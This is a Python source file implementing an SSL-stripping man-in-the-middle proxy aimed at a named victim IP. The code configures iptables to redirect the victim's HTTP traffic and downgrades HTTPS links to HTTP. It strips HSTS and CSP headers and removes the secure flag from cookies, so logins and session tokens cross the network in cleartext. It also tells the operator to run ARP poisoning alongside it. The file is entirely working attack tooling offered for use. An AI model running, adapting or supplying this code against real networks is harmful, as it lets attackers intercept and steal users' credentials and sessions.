# ssl_stripping.py
# New Dependencies: pip install requests beautifulsoup4

import subprocess
import atexit
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
from bs4 import BeautifulSoup

# --- Global Configuration ---
# This dictionary will hold configuration passed from the launcher.
CONFIG = {
    'VICTIM_IP': None,
    'ATTACKER_IP': None,
    'PROXY_PORT': 8080, # The local port our proxy will listen on.
}

def setup_iptables_and_forwarding():
    """
    Configures the system to act as a router and redirects the victim's
    HTTP traffic (port 80) to our local proxy port.
    """
    proxy_port = CONFIG['PROXY_PORT']
    print(f"[*] Configuring iptables to redirect victim's port 80 traffic to local port {proxy_port}...")

    # 1. Enable IP forwarding to allow traffic to pass through the attacker's machine.
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True, capture_output=True)

    # 2. Add a NAT rule to redirect any TCP traffic on port 80 to our proxy port.
    # This rule is in the PREROUTING chain, so it catches packets as they arrive.
    subprocess.run([
        "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
        "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT",
        "--to-port", str(proxy_port)
    ], check=True)

    print("[+] Traffic redirection is active.")

def cleanup_iptables_and_forwarding():
    """
    Restores the original network configuration by removing our iptables rule
    and disabling IP forwarding. This is crucial for network cleanup.
    """
    proxy_port = CONFIG['PROXY_PORT']
    print("\n[*] Cleaning up iptables rules and disabling IP forwarding...")

    # Remove the NAT rule we added.
    subprocess.run([
        "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
        "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT",
        "--to-port", str(proxy_port)
    ], check=False, capture_output=True)

    # Disable IP forwarding.
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=False, capture_output=True)

    print("[+] Network configuration restored.")

class ProxyHandler(BaseHTTPRequestHandler):
    """
    This handler processes each HTTP request from the victim. It forwards the request
    to the destination server over HTTPS, then strips security from the response.
    """
    def handle_request(self, method):
        # Prevent proxy loops by ignoring requests from the attacker machine itself.
        if self.client_address[0] == CONFIG['ATTACKER_IP']:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Attacker request ignored. SSL Stripping Proxy is active.")
            return

        host = self.headers.get('Host')
        if not host:
            self.send_error(400, "Bad Request: Missing 'Host' header")
            return

        # Reconstruct the target URL, forcing it to be HTTPS.
        target_url = f"https://{host}{self.path}"
        print(f"[*] Intercepted {method} from {self.client_address[0]} -> {target_url}")

        try:
            # Prepare headers for the outgoing request.
            forward_headers = {key: value for key, value in self.headers.items()}
            
            # Read POST data if present.
            post_data = None
            if method == 'POST':
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)

            # Make the request to the real server over HTTPS.
            # `verify=False` is used as we are the client; it doesn't affect victim's security.
            response = requests.request(
                method,
                target_url,
                headers=forward_headers,
                data=post_data,
                verify=False,
                allow_redirects=False # Handle redirects manually to control the protocol.
            )

            # Begin sending the server's response back to the victim.
            self.send_response(response.status_code)

            modified_content = response.content
            content_type = response.headers.get('Content-Type', '').lower()

            # If the response is HTML, strip its security.
            if 'text/html' in content_type:
                # Use BeautifulSoup to reliably find and replace all HTTPS links.
                soup = BeautifulSoup(response.text, 'html.parser')
                for tag in soup.find_all(href=True):
                    tag['href'] = tag['href'].replace('https://', 'http://')
                modified_content = str(soup).encode('utf-8')

            # Process headers from the server's response.
            for key, value in response.headers.items():
                # Remove security headers that would enforce HTTPS.
                if key.lower() in ['strict-transport-security', 'content-security-policy', 'content-encoding']:
                    continue
                # Downgrade secure cookies so they can be sent over HTTP.
                if key.lower() == 'set-cookie':
                    value = value.replace('; secure', '')
                # Recalculate Content-Length since we may have modified the body.
                if key.lower() == 'content-length':
                    self.send_header(key, str(len(modified_content)))
                else:
                    self.send_header(key, value)
            
            self.end_headers()
            self.wfile.write(modified_content)

        except requests.exceptions.RequestException as e:
            print(f"[!] Could not connect to {target_url}. Error: {e}")
            self.send_error(502, f"Proxy Error: {e}")

    def do_GET(self):
        self.handle_request('GET')

    def do_POST(self):
        self.handle_request('POST')

class SSLStripper:
    def __init__(self, interface, ip_victim, ip_attacker):
        CONFIG['VICTIM_IP'] = ip_victim
        CONFIG['ATTACKER_IP'] = ip_attacker
        self.interface = interface
        self.proxy_port = CONFIG['PROXY_PORT']

    def strip(self):
        # Suppress warnings about self-signed certificates from the 'requests' library.
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
        
        # Set up forwarding and register the cleanup function to run on exit.
        setup_iptables_and_forwarding()
        atexit.register(cleanup_iptables_and_forwarding)

        # Start the proxy server.
        server_address = ('0.0.0.0', self.proxy_port)
        httpd = HTTPServer(server_address, ProxyHandler)
        
        print(f"[*] SSL Stripping proxy server starting on port {self.proxy_port}...")
        print("[*] ARP poisoning must be running simultaneously to route traffic here.")
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Shutting down proxy server.")
            httpd.server_close()
